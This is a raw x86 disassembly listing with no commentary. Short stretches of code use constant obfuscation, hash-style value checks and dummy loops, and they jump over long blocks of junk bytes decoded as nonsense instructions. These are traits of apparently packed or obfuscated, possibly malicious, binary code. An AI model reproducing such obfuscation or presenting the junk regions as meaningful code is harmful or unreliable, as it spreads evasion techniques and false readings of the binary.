  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	and    bl,BYTE PTR [ebx]
  4041d7:	scas   al,BYTE PTR es:[edi]
  4041d8:	mov    esp,0x7e7e1b52
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404213
  4041e2:	in     al,0xb0
  4041e4:	aad    0x51
  4041e6:	jp     0x4041e1
  4041e8:	sar    BYTE PTR [ecx],0x27
  4041eb:	mov    esi,DWORD PTR [ebx+0x5c86c60d]
  4041f1:	out    0xf0,al
  4041f3:	mov    esi,0xd088d080
  4041f8:	xor    BYTE PTR [ecx],ah
  4041fa:	sahf   
  4041fb:	pop    edi
  4041fc:	(bad)  
  4041fd:	loop   0x404197
  4041ff:	xchg   ebx,eax
  404200:	ds mov edi,0x4e4a567
  404206:	lods   eax,DWORD PTR ds:[esi]
  404207:	add    al,0x0
  404209:	(bad)  
  40420a:	sub    eax,0x7a15c4c4
  40420f:	mov    al,ds:0x624b79a1
  404214:	or     eax,0x89c20f27
  404219:	push   0x5
  40421b:	mov    edi,0x7f91cb96
  404220:	pop    eax
  404221:	stc    
  404222:	ret    0xd2df
  404225:	dec    edi
  404226:	xchg   ebp,eax
  404227:	push   ss
  404228:	clc    
  404229:	adc    bl,BYTE PTR [edx]
  40422b:	shr    DWORD PTR [edi*8-0x1e31f1ce],1
  404232:	xor    dh,BYTE PTR [ecx]
  404234:	call   0xb0d:0x8abd678c
  40423b:	dec    esp
  40423c:	dec    esp
  40423d:	cmp    dl,bl
  40423f:	pusha  
  404240:	mov    esi,DWORD PTR [ebp-0x4726e8d3]
  404246:	(bad)  
  404247:	into   
  404248:	js     0x404263
  40424a:	sar    ax,0xa8
  40424e:	jmp    0x5033:0xdb107238
  404255:	push   0x39b1abb5
  40425a:	(bad)  
  40425b:	or     al,0xc0
  40425d:	inc    esi
  40425e:	(bad)  
  40425f:	mov    ah,0x7b
  404261:	out    dx,al
  404262:	and    dl,ah
  404264:	adc    eax,0xab068eb5
  404269:	and    eax,esi
  40426b:	aaa    
  40426c:	sub    DWORD PTR [ebx-0x41592e67],0x67b75b5d
  404276:	xlat   BYTE PTR ds:[ebx]
  404277:	lahf   
  404278:	les    esp,FWORD PTR [ecx+0x4126aeda]
  40427e:	xchg   ch,ch
  404280:	stos   DWORD PTR es:[edi],eax
  404281:	mov    ecx,0x5e28a705
  404286:	mov    ds:0xf8387e2f,eax
  40428b:	js     0x4042d4
  40428d:	retf   0xd09e
  404290:	dec    esp
  404291:	cmp    al,0xac
  404293:	dec    ebx
  404294:	aam    0xbf
  404296:	ins    DWORD PTR es:[edi],dx
  404297:	mov    eax,ds:0x2e79cae0
  40429c:	sti    
  40429d:	in     al,0xe
  40429f:	add    dl,BYTE PTR [edi]
  4042a1:	inc    eax
  4042a2:	fdiv   st(4),st
  4042a4:	pop    edx
  4042a5:	cwde   
  4042a6:	mov    bh,0x70
  4042a8:	int3   
  4042a9:	fimul  DWORD PTR [ebp-0x4b]
  4042ac:	cld    
  4042ad:	push   ss
  4042ae:	into   
  4042af:	pop    esi
  4042b0:	dec    esi
  4042b1:	mov    ?,esi
  4042b3:	mov    bh,0x95
  4042b5:	xor    eax,0x4aa13792
  4042ba:	sub    eax,0xb9061c1e
  4042bf:	pusha  
  4042c0:	(bad)  
  4042c2:	out    0x78,al
  4042c4:	aad    0xbb
  4042c6:	test   al,0xca
  4042c8:	ret    
  4042c9:	fwait
  4042ca:	out    dx,eax
  4042cb:	(bad)  
  4042cc:	xor    DWORD PTR [edx+0x56e40dff],ebp
  4042d2:	and    BYTE PTR [esi+esi*1-0x7030afc0],cl
  4042d9:	mov    BYTE PTR [ebx-0x76],dl
  4042dc:	and    dl,BYTE PTR [ebx-0x3bb39d89]
  4042e2:	jo     0x404336
  4042e4:	adc    eax,0xc61b93e3
  4042e9:	push   ebx
  4042ea:	int3   
  4042eb:	stos   BYTE PTR es:[edi],al
  4042ec:	jl     0x4042ec
  4042ee:	push   edi
  4042ef:	dec    esp
  4042f0:	or     BYTE PTR [edi-0x78],bh
  4042f3:	push   esp
  4042f4:	shr    BYTE PTR ss:[ebx],1
  4042f7:	mov    fs,esp
  4042f9:	xchg   cl,ah
  4042fb:	pop    edi
  4042fc:	mov    bh,0x9f
  4042fe:	mov    ah,0x5c
  404300:	stos   DWORD PTR es:[edi],eax
  404301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404302:	jns    0x404297
  404304:	pushf  
  404305:	vpavgb xmm3,xmm4,XMMWORD PTR [ebx-0x65]
  40430a:	jnp    0x4042e8
  40430c:	fisub  WORD PTR [ebx+0x1ff8323c]
  404312:	mov    DWORD PTR [ebx],edi
  404314:	mov    ds,WORD PTR [edx+eiz*1+0x12]
  404318:	xor    ebx,0xd2c2d777
  40431e:	jp     0x4042d1
  404320:	xchg   DWORD PTR [esi],edi
  404322:	cmc    
  404323:	mov    esp,0xdb9e302c
  404328:	inc    esi
  404329:	ror    dl,cl
  40432b:	push   esp
  40432c:	pop    esp
  40432d:	sub    al,0x73
  40432f:	out    0x3b,eax
  404331:	add    DWORD PTR [edi],ebp
  404333:	pop    esi
  404334:	mov    ebp,0x9bea8bed
  404339:	xor    ecx,eax
  40433b:	cdq    
  40433c:	add    al,0xde
  40433e:	mov    bl,0x14
  404341:	adc    DWORD PTR ds:0x5fee9a6a,edi
  404347:	mov    bh,dl
  404349:	sub    al,bl
  40434b:	call   0xf4db:0x5b1dfd20
  404352:	or     dh,al
  404354:	cmp    eax,0x31c863ae
  404359:	sub    al,bh
  40435b:	jle    0x40433d
  40435d:	shl    DWORD PTR [ecx-0x33],0xd0
  404361:	xchg   DWORD PTR [edi-0x6b],ecx
  404364:	(bad)  
  404365:	sub    DWORD PTR [esi],edx
  404367:	inc    ecx
  404368:	xor    ecx,DWORD PTR gs:0x7d3055f5
  40436f:	std    
  404370:	and    BYTE PTR [eax+0x3c42c403],0x28
  404377:	out    0xf1,al
  404379:	push   cs
  40437a:	pop    esi
  40437b:	cld    
  40437c:	jge    0x4042ff
  40437e:	push   eax
  40437f:	loope  0x40430c
  404381:	je     0x4043d5
  404383:	sub    eax,0x5c461627
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ecef,0x42e6c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ece7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430335,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ecef,0x430335
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4303df,0x42e6c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e6cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ece3,0x42eceb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42eceb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43034d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	inc    edx
  40442d:	cmp    bh,BYTE PTR [edx]
  40442f:	loop   0x40442e
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x4044a5
  404439:	aaa    
  40443a:	lea    ecx,[esi+0x53]
  40443d:	pop    esp
  40443e:	jae    0x4043f7
  404440:	pusha  
  404441:	xor    ebx,DWORD PTR [edx+0x49]
  404444:	xor    DWORD PTR [ecx+0x67],ebx
  404447:	rcr    DWORD PTR [ecx+0x540cc014],cl
  40444d:	pop    esp
  40444e:	xchg   ebx,eax
  40444f:	sbb    BYTE PTR [ecx-0x6a],bh
  404452:	or     DWORD PTR [esi+0x5e5a2f85],0xffffffa5
  404459:	fcomp  DWORD PTR ds:0xe7affdbd
  40445f:	popf   
  404460:	push   ecx
  404461:	mov    al,0x63
  404463:	stos   BYTE PTR es:[edi],al
  404464:	inc    edi
  404465:	ja     0x404426
  404467:	jge    0x40441e
  404469:	sbb    esi,DWORD PTR [edi]
  40446b:	pushf  
  40446c:	icebp  
  40446d:	pop    ebp
  40446e:	mov    dl,0x60
  404470:	and    dh,BYTE PTR [edx]
  404472:	add    al,0x4b
  404474:	int3   
  404475:	icebp  
  404476:	ds mov dl,0xa9
  404479:	dec    ebp
  40447a:	cmc    
  40447b:	pop    esp
  40447c:	sub    dl,BYTE PTR [edi]
  40447e:	cmp    eax,0x6484ca3b
  404483:	xor    ebp,edi
  404485:	jecxz  0x404494
  404487:	imul   edx,DWORD PTR [ecx+0x4d],0xffffff97
  40448b:	sbb    al,0xf3
  40448d:	in     eax,dx
  40448e:	jg     0x4044dd
  404490:	in     eax,0xf4
  404492:	add    al,0xde
  404494:	mov    esi,0xa24203cb
  404499:	popf   
  40449a:	or     eax,DWORD PTR [ebx+0x3c]
  40449d:	adc    DWORD PTR [esi+0x3f],edx
  4044a0:	pop    ds
  4044a1:	xor    ch,BYTE PTR [esi]
  4044a3:	lock rol BYTE PTR [esp+ebp*4],1
  4044a7:	jecxz  0x4044b9
  4044a9:	call   0xd483:0xc573b565
  4044b0:	mov    ebx,0x13207c8f
  4044b5:	pop    ds
  4044b6:	jns    0x404463
  4044b8:	fbld   TBYTE PTR ds:0xdc62ff2a
  4044be:	lods   al,BYTE PTR ds:[esi]
  4044bf:	jecxz  0x4044b7
  4044c1:	xor    eax,0xb94bd8b1
  4044c6:	aam    0x97
  4044c8:	mov    esp,0x2bd3e3d1
  4044cd:	cmp    eax,0x256a4d0a
  4044d2:	sahf   
  4044d3:	cdq    
  4044d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d5:	xchg   DWORD PTR [edi],ebx
  4044d7:	pop    eax
  4044d8:	pusha  
  4044d9:	into   
  4044da:	out    0xfd,al
  4044dc:	push   cs
  4044dd:	mov    ds:0x19b0cd81,eax
  4044e2:	pop    edx
  4044e3:	test   edx,esp
  4044e5:	lods   eax,DWORD PTR ds:[esi]
  4044e6:	push   es
  4044e7:	adc    ax,0x5b3a
  4044eb:	pop    esi
  4044ec:	shl    BYTE PTR [edi-0x17d46ed3],1
  4044f2:	icebp  
  4044f3:	rol    BYTE PTR [eax-0x14f3688f],cl
  4044f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044fa:	test   BYTE PTR [ebx],ah
  4044fc:	ja     0x404546
  4044fe:	fsubr  st(7),st
  404500:	mov    ecx,0x6277d8ad
  404505:	jmp    0xd93e78d0
  40450a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40450b:	ins    BYTE PTR es:[edi],dx
  40450c:	push   eax
  40450d:	test   ah,al
  40450f:	pop    esi
  404510:	xchg   esi,eax
  404511:	shl    BYTE PTR [ebx+0x7a],1
  404514:	lahf   
  404515:	jmp    0x862f409d
  40451a:	sbb    DWORD PTR [eax],eax
  40451c:	retf   
  40451d:	xlat   BYTE PTR ds:[ebx]
  40451e:	pop    es
  40451f:	fstp   QWORD PTR [eax-0x4]
  404522:	cmp    edx,edx
  404524:	pop    esi
  404525:	dec    esi
  404526:	push   esi
  404527:	sub    esi,DWORD PTR [ebp-0x4ab9d4b8]
  40452d:	inc    ebp
  40452e:	add    DWORD PTR [esi],esp
  404530:	ins    DWORD PTR es:[edi],dx
  404531:	nop
  404532:	mov    bh,0x75
  404534:	and    BYTE PTR [edx+0x67],ch
  404537:	inc    ebx
  404538:	mov    ds:0xc71bd629,eax
  40453d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40453e:	dec    ebx
  40453f:	xor    al,0xc4
  404541:	adc    DWORD PTR [edx-0x3c5bef48],0xfffffffe
  404548:	aam    0x8a
  40454a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40454b:	or     eax,0xfcb0c177
  404550:	and    BYTE PTR [edx+0x2b],ch
  404553:	shl    bh,0x95
  404556:	repz jg 0x404525
  404559:	adc    eax,0x151e3214
  40455e:	js     0x404550
  404560:	dec    esp
  404561:	js     0x4044eb
  404563:	and    ah,ah
  404565:	js     0x40450e
  404567:	fld    TBYTE PTR [edx-0x1e04a3cf]
  40456d:	les    edi,FWORD PTR [eax-0x72]
  404570:	jnp    0x4045cb
  404572:	sahf   
  404573:	out    0xf6,eax
  404575:	call   0x86d2:0x69b1d02d
  40457c:	loope  0x4045fd
  40457e:	cmp    DWORD PTR [esp+eax*8+0x59c5a381],eax
  404585:	push   es
  404586:	dec    ebx
  404587:	pop    eax
  404588:	fdivr  QWORD PTR [ecx-0x17]
  40458b:	fld    DWORD PTR [edi-0x53375872]
  404591:	imul   edx,DWORD PTR [esi],0xffffff81
  404594:	mov    dl,0xe2
  404596:	inc    esi
  404597:	push   ebp
  404598:	mov    al,0xac
  40459a:	adc    eax,DWORD PTR [eax+edi*2-0x34]
  40459e:	sub    eax,0x9283c92e
  4045a3:	jmp    0xf914:0xa5454706
  4045aa:	mov    ds:0x8bab80a,al
  4045af:	pusha  
  4045b0:	cmp    al,0x20
  4045b2:	cmp    al,0x5
  4045b4:	mov    DWORD PTR gs:[edx],0xb11efc53
  4045bb:	(bad)  
  4045bc:	mov    edi,0x6a072e56
  4045c1:	jne    0x404547
  4045c3:	dec    edx
  4045c4:	std    
  4045c5:	ds mov ebx,0xdb3b0993
  4045cb:	ds aam 0x6a
  4045ce:	sub    ch,dh
  4045d0:	in     al,dx
  4045d1:	add    BYTE PTR [ebx-0x39],dh
  4045d4:	das    
  4045d5:	fs add al,0x5
  4045d8:	or     BYTE PTR [ebx],ch
  4045da:	fwait
  4045db:	pop    ss
  4045dc:	or     BYTE PTR [ebp+0x57],bh
  4045df:	add    eax,ecx
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4303e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430339,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430339
  40460c:	inc    eax
  40460d:	mov    ds:0x430339,eax
  404612:	cmp    DWORD PTR ds:0x430339,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430339,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42eb13
  404650:	cmp    DWORD PTR ds:0x430339,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430339
  404662:	inc    eax
  404663:	mov    ds:0x430339,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ecd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430339,0x430371
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43035d,0x42ecdb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404752
  4046fa:	out    0x29,eax
  4046fc:	cwde   
  4046fd:	and    al,0x27
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x4046b1
  404706:	pop    esi
  404707:	call   0xb649:0x1a4f5e10
  40470e:	or     dh,BYTE PTR [edx-0x4094698c]
  404714:	jl     0x4046e7
  404716:	and    ebx,DWORD PTR [edx+0x35]
  404719:	je     0x4046cf
  40471b:	es pushf 
  40471d:	call   0x619f:0xc45fdf91
  404724:	sbb    eax,0xafa5d467
  404729:	aam    0xe4
  40472b:	cmp    ebx,DWORD PTR [ecx]
  40472d:	xchg   DWORD PTR [ecx],ebx
  40472f:	adc    DWORD PTR [esi-0x5],ebp
  404732:	sti    
  404733:	rol    DWORD PTR [edx+0x24],1
  404736:	ss jbe 0x40475d
  404739:	cmp    al,0x22
  40473b:	mov    esi,0x563a2e04
  404740:	sbb    BYTE PTR [edx+ecx*1+0x2cb7d378],0x6
  404748:	imul   edi,DWORD PTR es:[ebx+0x6d9947ad],0xffffffdf
  404750:	sbb    BYTE PTR [edi+0x25],dh
  404753:	mov    ebp,0x341ab18b
  404758:	mov    edx,0xc3a0876a
  40475d:	push   ds
  40475e:	rcr    DWORD PTR [ebx-0x20],1
  404761:	sbb    al,0xa2
  404763:	dec    ebp
  404764:	mov    ebp,0xc17ee2f9
  404769:	mov    ecx,0x75d9ccb1
  40476e:	fidivr DWORD PTR ds:0xe03fac88
  404774:	shr    BYTE PTR [eax+0x41],1
  404777:	or     dh,BYTE PTR [esi-0x76c6a160]
  40477d:	adc    eax,0xeb670dfc
  404782:	pop    eax
  404783:	add    DWORD PTR [ebp-0x28113110],ebx
  404789:	les    ebx,FWORD PTR [esi]
  40478b:	jle    0x40471f
  40478d:	es add esp,ebx
  404790:	jle    0x40473c
  404792:	xor    al,0xcf
  404794:	push   esi
  404795:	xlat   BYTE PTR ds:[ebx]
  404796:	dec    edx
  404797:	scas   al,BYTE PTR es:[edi]
  404798:	(bad)  
  404799:	in     al,0xe9
  40479b:	aam    0xbe
  40479d:	std    
  40479e:	test   eax,0x18796f40
  4047a3:	adc    al,0xe2
  4047a5:	inc    eax
  4047a6:	dec    edi
  4047a7:	xchg   ecx,eax
  4047a8:	in     eax,dx
  4047a9:	and    edx,DWORD PTR [ecx]
  4047ab:	sbb    esi,esi
  4047ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ae:	ror    DWORD PTR [ecx+0x65019ab2],1
  4047b4:	pop    ss
  4047b5:	xchg   BYTE PTR [ebp-0x71344040],bh
  4047bb:	std    
  4047bc:	mov    ds:0x748fd2f5,eax
  4047c1:	cmp    al,0x88
  4047c3:	pushf  
  4047c4:	repnz fwait
  4047c6:	or     ebx,ebp
  4047c8:	push   ecx
  4047c9:	pop    ds
  4047ca:	mov    eax,ds:0x6bc140ce
  4047cf:	xchg   esi,eax
  4047d0:	push   edx
  4047d1:	sbb    DWORD PTR [edx],0xffffffd7
  4047d4:	jge    0x404831
  4047d6:	xchg   edx,eax
  4047d7:	pop    eax
  4047d8:	call   0xc36b6575
  4047dd:	int    0x1a
  4047df:	test   BYTE PTR [ecx+0x4d],bl
  4047e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047e3:	sti    
  4047e4:	(bad)  
  4047e5:	outs   dx,DWORD PTR ds:[esi]
  4047e6:	out    dx,eax
  4047e7:	mov    dl,0x74
  4047e9:	add    DWORD PTR [ebx-0xe],0x9f6929
  4047f0:	jno    0x4047e0
  4047f2:	repz inc esp
  4047f4:	adc    BYTE PTR [ecx+0x3d5fb508],dh
  4047fa:	daa    
  4047fb:	js     0x404877
  4047fd:	shl    DWORD PTR [eax+0x7a],1
  404800:	and    edi,DWORD PTR ds:0x6c86547
  404806:	test   BYTE PTR [ebx-0x1e],cl
  404809:	sbb    bh,cl
  40480b:	daa    
  40480c:	inc    edi
  40480d:	retf   
  40480e:	sar    DWORD PTR [ecx+0x79],cl
  404811:	out    dx,al
  404812:	not    cl
  404814:	add    eax,0xef39e983
  404819:	and    bl,0x2b
  40481c:	mov    ebp,0x6bbce72c
  404821:	mov    edi,0x71980f22
  404826:	popa   
  404827:	sub    al,0x85
  404829:	dec    ebp
  40482a:	aad    0xcd
  40482c:	jge    0x404812
  40482e:	ror    DWORD PTR [ecx],cl
  404830:	aas    
  404831:	(bad)  
  404832:	cmp    DWORD PTR [ebx-0x41f389a6],ecx
  404838:	fdivr  DWORD PTR [ecx]
  40483a:	stos   DWORD PTR es:[edi],eax
  40483b:	adc    DWORD PTR [eax-0x67404d25],edx
  404841:	lods   eax,DWORD PTR ds:[esi]
  404842:	adc    ecx,ebx
  404844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404845:	enter  0xd2d9,0xa3
  404849:	mov    ebp,0x99c0563
  40484e:	fldcw  WORD PTR [esi+0x5b]
  404851:	or     dl,BYTE PTR [ecx+0x3]
  404854:	or     al,0xf8
  404856:	hlt    
  404857:	sar    esi,0xa0
  40485a:	ins    DWORD PTR es:[edi],dx
  40485b:	int    0x91
  40485d:	jecxz  0x4048da
  40485f:	daa    
  404860:	sbb    al,0x77
  404862:	daa    
  404863:	xchg   BYTE PTR [eiz*1+0x7e28101d],bh
  40486a:	xchg   ch,cl
  40486c:	rcl    BYTE PTR [ecx],cl
  40486e:	xor    edx,eax
  404870:	dec    eax
  404871:	mov    ch,0x6a
  404873:	xchg   esi,eax
  404874:	not    BYTE PTR [esi-0x65]
  404877:	cmp    al,0x26
  404879:	lods   al,BYTE PTR ds:[esi]
  40487a:	jge    0x40488d
  40487c:	mov    dh,0xad
  40487e:	mov    al,0xea
  404880:	mov    WORD PTR [ebx-0x21d0be32],?
  404886:	repz lahf 
  404888:	and    DWORD PTR [ebx-0x23],esp
  40488b:	fwait
  40488c:	es pop ss
  40488e:	daa    
  40488f:	leave  
  404890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404892:	sub    al,0xd2
  404894:	imul   esp
  404896:	dec    esp
  404897:	sysenter 
  404899:	fs mov esi,0x350b8bd3
  40489f:	pop    esp
  4048a0:	sub    BYTE PTR [esi],ch
  4048a2:	pop    ebp
  4048a3:	jle    0x4048b7
  4048a5:	iret   
  4048a6:	aad    0x61
  4048a8:	data16 mov al,0xea
  4048ab:	int3   
  4048ac:	sub    al,0xf2
  4048ae:	xchg   ecx,eax
  4048af:	sbb    ecx,ecx
  4048b1:	dec    ebp
  4048b2:	dec    ebp
  4048b3:	mov    bl,bh
  4048b5:	retf   
  4048b6:	icebp  
  4048b7:	lds    ecx,FWORD PTR [eax+0x27]
  4048ba:	in     eax,0x73
  4048bc:	mov    ch,0x38
  4048be:	imul   ebx,DWORD PTR [edx+eax*8],0xc475c880
  4048c5:	loopne 0x4048eb
  4048c7:	shr    DWORD PTR ds:0xcac9b3f0,1
  4048cd:	mov    DWORD PTR [esp+ecx*1+0x34],edi
  4048d1:	fimul  DWORD PTR [ebx]
  4048d3:	sar    DWORD PTR [esi+0xf76ee18],1
  4048d9:	sahf   
  4048da:	mov    DWORD PTR [ebp+0x2d],ecx
  4048dd:	sbb    eax,0x6976734a
  4048e2:	mov    ah,ah
  4048e4:	cmp    al,BYTE PTR [eax]
  4048e6:	jmp    DWORD PTR es:[edx-0x4f]
  4048ea:	fucomip st,st(0)
  4048ec:	pop    ecx
  4048ed:	pop    esp
  4048ee:	daa    
  4048ef:	test   al,0x6e
  4048f1:	aaa    
  4048f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f3:	dec    ebp
  4048f4:	sahf   
  4048f5:	xor    al,0x98
  4048f7:	stos   BYTE PTR es:[edi],al
  4048f8:	test   DWORD PTR ds:0xb62aa019,ebx
  4048fe:	out    dx,al
  4048ff:	jp     0x4048b5
  404901:	in     eax,dx
  404902:	test   eax,0x6700e0e
  404907:	push   ebp
  404908:	cdq    
  404909:	loope  0x4048ad
  40490b:	es push ebp
  40490d:	xchg   ebx,eax
  40490e:	clc    
  40490f:	inc    edi
  404910:	pop    es
  404911:	jae    0x40496b
  404913:	out    dx,al
  404914:	jge    0x4048f9
  404916:	sub    al,dl
  404918:	sub    eax,0xfa79b5b9
  40491d:	mov    eax,DWORD PTR [eax+0x3d]
  404920:	cmp    dh,BYTE PTR [ecx]
  404922:	test   DWORD PTR [eax],eax
  404924:	adc    DWORD PTR [eax+0x6e66af2b],0xb2f5f7fa
  40492e:	shr    DWORD PTR [esi],cl
  404930:	das    
  404931:	inc    esi
  404932:	push   ebp
  404933:	mov    cl,0x47
  404935:	retf   
  404936:	neg    ebx
  404938:	sahf   
  404939:	add    BYTE PTR [ebp-0xc],ah
  40493c:	sub    esi,DWORD PTR [ebp+0x50]
  40493f:	popa   
  404940:	repz mov cl,0x6e
  404943:	xor    al,ch
  404945:	icebp  
  404946:	mov    ss,eax
  404948:	or     al,0x9f
  40494a:	shr    DWORD PTR ds:0xbf04ddad,0xa9
  404951:	mov    bl,0x99
  404953:	lock outs dx,BYTE PTR ds:[esi]
  404955:	imul   ebp,DWORD PTR [ebx],0x216ee129
  40495b:	stc    
  40495c:	je     0x40494f
  40495e:	or     DWORD PTR ds:0x3acdd43c,0x2c
  404965:	(bad)  
  404966:	and    dl,BYTE PTR [eax]
  404968:	push   edx
  404969:	inc    eax
  40496a:	or     ah,BYTE PTR [edi-0x6d]
  40496d:	or     DWORD PTR [eax+ecx*2+0x5e],ebp
  404971:	mov    bh,0xc
  404973:	and    BYTE PTR [ecx],dl
  404975:	scas   al,BYTE PTR es:[edi]
  404976:	xor    DWORD PTR [ebp-0x5d],edi
  404979:	dec    eax
  40497a:	xchg   edi,eax
  40497b:	cmp    BYTE PTR [ebx+0x4914cc58],bl
  404981:	dec    BYTE PTR [edx+ebp*8-0x80]
  404985:	xor    DWORD PTR [eax],ecx
  404987:	std    
  404988:	call   0x8a90:0xca643695
  40498f:	lea    ebx,[edi+0x19]
  404992:	daa    
  404993:	pusha  
  404994:	sbb    dh,BYTE PTR [esi-0xacc590a]
  40499a:	and    esp,DWORD PTR [ebp+0xf8b4376]
  4049a0:	scas   eax,DWORD PTR es:[edi]
  4049a1:	arpl   bx,cx
  4049a3:	and    ecx,DWORD PTR [ecx-0x27da7efe]
  4049a9:	out    0x42,al
  4049ab:	add    BYTE PTR [eax],al
  4049ad:	add    BYTE PTR [eax],al
  4049af:	add    BYTE PTR [ebx],dh
  4049b1:	shl    BYTE PTR [ebx],cl
  4049b3:	adc    eax,0x42e6d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e6d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e6d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e8cf
  4049da:	cmp    DWORD PTR ds:0x42e6d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e6d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e6d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e6d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42eceb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4303cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ece7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4303e3,0x4303df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ece7,0x26eb
